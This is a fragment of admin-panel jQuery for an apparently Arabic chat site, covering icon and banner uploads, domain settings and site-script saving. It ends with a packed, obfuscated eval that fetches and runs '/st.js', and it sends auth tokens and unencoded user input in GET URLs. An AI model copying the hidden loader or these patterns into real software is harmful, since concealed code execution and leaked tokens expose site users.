				pico.children().remove();
				$.each(JSON.parse(data.sico),function(i,e){ 
					var ht=$('<div style="display:inline-block;padding:2px;margin:2px;margin-top:2px;" class="border"><img style="min-width: min-content; padding: 4px; height: 24px;"><a style="margin-left: 4px;padding:4px;" onclick="del_ico(this);" class="btn btn-danger fa fa-times">.</a></div>')
					ht.find('img').attr('src','/sico/'+e);
					ht.find('a').attr('pid','/sico/'+e);
					pico.append(ht); 
				});
				pico=$('.p-dro3'); 
				pico.children().remove();
				$.each(JSON.parse(data.dro3),function(i,e){ 
					var ht=$('<div style="display:inline-block;padding:2px;margin:2px;margin-top:2px;" class="border"><img style="max-width:24px;max-height:24px;"><a style="margin-left: 4px;padding:4px;" onclick="del_ico(this);" class="btn btn-danger fa fa-times">.</a></div>')
					ht.find('img').attr('src','/dro3/'+e);
					ht.find('a').attr('pid','/dro3/'+e);
					pico.append(ht); 
				});
				pico=$('.p-emo'); 
				pico.children().remove();
				$.each(JSON.parse(data.emo),function(i,e){ 
					var ht=$('<div style="display:inline-block;padding:2px;margin:2px;margin-top:2px;" class="border"><img style="max-width:24px;max-height:24px;"><a style="margin-left: 4px;padding:4px;" onclick="del_ico(this);" class="btn btn-danger fa fa-times">.</a></div>')
					ht.find('img').attr('src','/emo/'+e);
					ht.find('a').attr('pid','/emo/'+e);
					pico.append(ht); 
				});
			});
		}
		function s_dro3(fn){

			$.get('cp.nd?cmd=addico&token='+token+'&pid='+fn+'&tar=dro3',function(data){
				var d =JSON.parse(data)
				if(d){
					if(d.error){
						alert('فشل رفع الصوره')
					}else{
						var ht=$('<div style="display:inline-block;padding:2px;margin:2px;margin-top:2px;" class="border"><img style="max-width:24px;max-height:24px;"><a style="margin-left: 4px;padding:4px;" onclick="del_ico(this);" class="btn btn-danger fa fa-times">.</a></div>')
						ht.find('img').attr('src','/'+d.msg);
						ht.find('a').attr('pid',d.msg);
						$('.p-dro3').append(ht); 
					}

				}else{
					alert('فشل رفع الصوره')
				}
			});
		}
		function s_sico(fn){

			$.get('cp.nd?cmd=addico&token='+token+'&pid='+fn+'&tar=sico',function(data){
				var d =JSON.parse(data)
				if(d){
					if(d.error){
						alert('فشل رفع الصوره')
					}else{
						var ht=$('<div style="display:inline-block;padding:2px;margin:2px;margin-top:2px;" class="border"><img style="max-width:24px;max-height:24px;"><a style="margin-left: 4px;padding:4px;" onclick="del_ico(this);" class="btn btn-danger fa fa-times">.</a></div>');
						ht.find('img').attr('src','/'+d.msg);
						ht.find('a').attr('pid',d.msg);
						$('.p-sico').append(ht); 
					}


				}else{
					alert('فشل رفع الصوره')
				}
			}); 
		}
		
			function s_banner(fn){

			$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=banner',function(data){
				var d =JSON.parse(data)
				if(d){
					if(d.error){
						alert('فشل رفع الصوره')
					}else{
						$('.p-banner').attr('src','/site/'+d.msg.replace('banner/',''));
					}
				}else{
					alert('فشل رفع الصوره')
				}
			}); 
		}
		function s_pmpic(fn){

$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=pmpic',function(data){
	var d =JSON.parse(data)
	if(d){
		if(d.error){
			alert('فشل رفع الصوره')
		}else{
			$('.p-pmpic').attr('src','/site/'+d.msg.replace('pmpic/',''));
		}
	}else{
		alert('فشل رفع الصوره')
	}
}); 
}
function s_prvpic(fn){

$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=prvpic',function(data){
	var d =JSON.parse(data)
	if(d){
		if(d.error){
			alert('فشل رفع الصوره')
		}else{
			$('.p-prvpic').attr('src','/site/'+d.msg.replace('prvpic/',''));
		}
	}else{
		alert('فشل رفع الصوره')
	}
}); 
}
function s_prv2pic(fn){

$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=prv2pic',function(data){
	var d =JSON.parse(data)
	if(d){
		if(d.error){
			alert('فشل رفع الصوره')
		}else{
			$('.p-prv2pic').attr('src','/site/'+d.msg.replace('prv2pic/',''));
		}
	}else{
		alert('فشل رفع الصوره')
	}
}); 
}
function s_prv3pic(fn){

$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=prv3pic',function(data){
	var d =JSON.parse(data)
	if(d){
		if(d.error){
			alert('فشل رفع الصوره')
		}else{
			$('.p-prv3pic').attr('src','/site/'+d.msg.replace('prv3pic/',''));
		}
	}else{
		alert('فشل رفع الصوره')
	}
}); 
}
function s_storpic(fn){

$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=storpic',function(data){
	var d =JSON.parse(data)
	if(d){
		if(d.error){
			alert('فشل رفع الصوره')
		}else{
			$('.p-storpic').attr('src','/site/'+d.msg.replace('storpic/',''));
		}
	}else{
		alert('فشل رفع الصوره')
	}
}); 
}
		
			function s_logo(fn){
			$.get('cp.nd?cmd=addico&hs='+isstting+'&token='+token+'&pid='+fn+'&tar=logo',function(data){
				var d =JSON.parse(data)
				if(d){
					if(d.error){
						alert('فشل رفع الصوره')
					}else{
						$('.p-logo').attr('src','/site/'+d.msg.replace('logo/','')); 
					}

				}else{
					alert('فشل رفع الصوره')
				}
			}); 
		}
		function s_emo(fn){

			$.get('cp.nd?cmd=addico&token='+token+'&pid='+fn+'&tar=emo',function(data){
				var d =JSON.parse(data)
				if(d){
					if(d.error){
						alert('فشل رفع الصوره')
					}else{
						var ht=$('<div style="display:inline-block;padding:2px;margin:2px;margin-top:2px;" class="border"><img style="max-width:24px;max-height:24px;"><a style="margin-left: 4px;padding:4px;" onclick="del_ico(this);" class="btn btn-danger fa fa-times">.</a></div>');
						ht.find('img').attr('src','/'+d.msg);
						ht.find('a').attr('pid',d.msg);
						$('.p-emo').append(ht); 
					}
				}else{
					alert('فشل رفع الصوره')
				}
			});
		}
		function del_ico(btn){
			$.get('cp.nd?cmd=del_ico&token='+token+'&pid='+$(btn).attr('pid'),function(data){
				var d =JSON.parse(data)
				if(d){
					if(d.error){
						alert(d.msg)
					}else{
						$(btn).parent().remove();
					}
				}else{
					alert('فشل رفع الصوره')
				}

				//       if(d=='ok')
				//       else alert('فشل حذف الصوره')
			});
		}

		function sendfile3(e){
			$.get('cp.nd?cmd=delfpc&token='+token+'&event='+e,function(d){
				var jq = JSON.parse(d);
				hostin();
				bans();
				if(jq.data){
				alert(jq.data);
				};
			});
		}
		
		function isUrlValid(userInput) {
    var res = userInput.match(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
    if(res == null)
        return false;
    else
        return true;
}
		
			function sendfile4(){
			var urltv = $('#tvurl').val();
			if(urltv){
			$.get('cp.nd?cmd=addtv&token='+token+'&event='+urltv,function(d){
				var jq = JSON.parse(d);
				hostin();
				if(jq.data){
				alert(jq.data);
				};
			});
			 }else{
				alert('الرجاء التأكد من الرابط');			 
			 };
		}		
		
		var regex = new RegExp("^(http[s]?:\\/\\/(www\\.)?|ftp:\\/\\/(www\\.)?|www\\.){1}([0-9A-Za-z-\\.@:%_\+~#=]+)+((\\.[a-zA-Z]{2,3})+)(/(.)*)?(\\?(.)*)?");
		
		function sendfile6(type){
		if(type == 'add'){
			var urldom = $('#domineurl').val();
			if(urldom){
			$.get('cp.nd?cmd=adddmoin&token='+token+'&event='+urldom,function(d){
				var jq = JSON.parse(d);
				hostin();
				if(jq.data){
				alert(jq.data);
				$('#domineurl').val('');
				};
			});
			}else{
				alert('الرجاء التأكد من الرابط');			 
			};

		}else if(type == 'tfinish'){
		var dfinish = $('#dtfi').val();
			if(dfinish){
			$.get('cp.nd?cmd=tfinish&token='+token+'&event='+dfinish,function(d){
				hostin();
				alert("تم تعديل الاشتراك");
			});
			 }else{
				alert('الرجاء التأكد من الرابط');			 
			 };
		}else if(type == 'remove'){
		var namehost = $("#hostname").val();
	$.get('cp.nd?cmd=removedmoin&token='+token+'&event='+namehost,function(d){
				var jq = JSON.parse(d);
				hostin();
				if(jq.data){
				alert(jq.data);
				};
			});
};
		};
		
		  function sendfile5(){
			var mxpr = $('#Numberep').val();
			if(mxpr > 3 && mxpr < 100){
			$.get('cp.nd?cmd=addrep&token='+token+'&event='+mxpr,function(d){
				var jq = JSON.parse(d);
				hostin();
				if(jq.data){
				alert(jq.data);
				};
			});
			 }else{
				alert('يجب ان يكون الرقم بين 3 و  100');			 
			 };
		}
		
		function socketIo(e){
			$.get('cp.nd?cmd=socketIo&token='+token,function(d){
				var jq = JSON.parse(d);
				alert(jq.data);
			});
		}
		function sendfile2(id,onsend){
			var xx;
			var formData = new FormData();
			formData.append('photo',  sendfileaDis())
			xx = $.ajax({
				xhr: function () {
					var xhr = new window.XMLHttpRequest();
					//Upload progress
					xhr.upload.addEventListener("progress", function (evt) {
						if (evt.lengthComputable) { 
							var percentComplete = evt.loaded / evt.total;
						}
					}, false);
					return xhr;
				},
				timeout: 0,
				url: 'site?cmd=upSite&fo=site&token='+token,
				type: 'POST',
				data:formData ,
				cache: false,
				processData: false,
				contentType: false,
				success: function (d) {
				var data = JSON.parse(d);
					if(data.msg == 'ok'){
					sett_save(data.value);
					}else{
					alert('ليس لديك الصلاحية لتعديل الموقع')
					}
				},
				error: function (e) {  
				alert('تم رفض السكريبت يحتوي على فايروس يرجى تغيره')
				}
			}); 
		}
		
	
						
		function sendfileaDis(){
			var settdescription = $("#sett_description").val()
			var settscr = $("#sett_scr").val()
			var settkeywords = $('#sett_keywords').val();
			var name = $("#sett_name").val(),
			title = $("#sett_title").val();
			var d = {name:name,title:title,settdescription:settdescription,settscr:settscr,settkeywords:settkeywords};
			var file = new File([JSON.stringify(d)], "foo.js", {
				type: "text/javascript",
			});
			return file
		}
		function sett_save(ds){
			 const isho = $('#hostnames').val() || 1;
			var ss={
				siteScript : ds,
				bg:$('.sbg').val(),
				buttons:$('.sbuttons').val(),
				background:$('.sbackground').val(),
				walllikes:getwalllikes(),
				wallminutes:$('.wall_minutes').val(),
				bclikes:$('.wall_likes').val(),
				msgst:$('.msgstt').val(),
				pmlikes:$('.pmlikes').val(),
				miclikes:$('.miclikes').val(),
				notlikes:$('.notlikes').val(),
				fileslikes:$('.fileslikes').val(),
				allowg:$(".allowg").is(":checked"),
				allowreg:$(".allowreg").is(":checked") 
			};
			$.get('cp.nd?cmd=sitesave&domin='+isho+'&token='+token + '&data=' + JSON.stringify(ss),function(d){
				var data=JSON.parse(d);
				if(data.err==true){
					$('#sett').text('لا تملك صلاحيات');return;
				}else{
					alert('تم حفظ التعديلات بنجاح');
				}
			}); 
		}
		
        eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.0(\'/1.2\');',3,3,'getScript|st|js'.split('|'),0,{}))